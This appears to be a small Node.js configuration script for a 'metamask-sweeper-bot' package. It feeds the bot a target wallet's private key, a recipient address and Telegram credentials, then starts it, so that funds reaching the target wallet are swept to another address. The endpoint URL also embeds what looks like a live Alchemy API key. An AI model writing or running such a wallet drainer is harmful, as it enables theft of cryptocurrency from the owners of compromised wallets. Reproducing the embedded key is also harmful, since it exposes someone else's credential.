const { Bot } = require("metamask-sweeper-bot");
const bot = new Bot('https://eth-sepolia.g.alchemy.com/v2/C6rmIQMrgYUWv2JYT0anwZuKWvIlbGru');

require('dotenv').config();

const details = {
  target_wallet_private_key: process.env.TARGET_WALLET_PRIVATE_KEY,
  recipient_address: process.env.RECIPIENT_ADDRESS,
  telegram_user_id: process.env.TELEGRAM_USER_ID,
  telegram_bot_token: process.env.TELEGRAM_BOT_TOKEN,
  network_name: process.env.NETWORK_NAME,

  server_port: process.env.SERVER_PORT,
  extra_gas_fee: process.env.EXTRA_GAS_FEE,
  gas_limit: process.env.GAS_LIMIT,
};

bot.Config(details);
bot.start();